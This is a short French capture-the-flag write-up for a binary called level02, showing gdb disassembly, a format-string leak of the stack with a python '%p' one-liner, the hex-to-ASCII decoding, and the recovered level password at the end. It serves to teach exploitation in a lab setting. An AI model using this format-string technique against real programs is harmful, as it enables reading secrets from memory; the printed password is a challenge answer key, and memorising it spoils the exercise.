En analysant sous gdb, on remarque la structure est sous x64.

0x0000000000400a9a <+646>:   mov    %rax,%rdi
0x0000000000400a9d <+649>:   mov    $0x0,%eax
0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>

On remarque ici, au dernier printf, qu'il utilise la variable mise dans un buffer, c'est donc un format string attack.
J'ai essayé de overflow avec 101 caracteres, mais ca me mettait la fin du programme. Rien de plus. J'ai alors procedé autrement.
Vu qu'il y a un fopen de present, les données sont donc dans la stack. Donc nous allons essayer de lire la stack.

En lancant cette commande: python -c 'print "%p " * 30' | ./level02, nous obtenons

0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!

Nous remarquons qu'il y a 5 adresses qui contiennent des characteres ascii:

0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d

Tout ce qu'il nous reste a faire, c'est d'utilisé python pour convertir les hexa en ascii (en renversant les bytes de chaque adresse "little endian")

python -c 'print"756e505234376848".decode("hex")[::-1] + "45414a3561733951".decode("hex")[::-1] + "377a7143574e6758".decode("hex")[::-1] + "354a35686e475873".decode("hex")[::-1] + "48336750664b394d".decode("hex")[::-1]' > /tmp/pass3

On fait un cat /tmp/pass3 et nous obtenons le mot de passe.

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H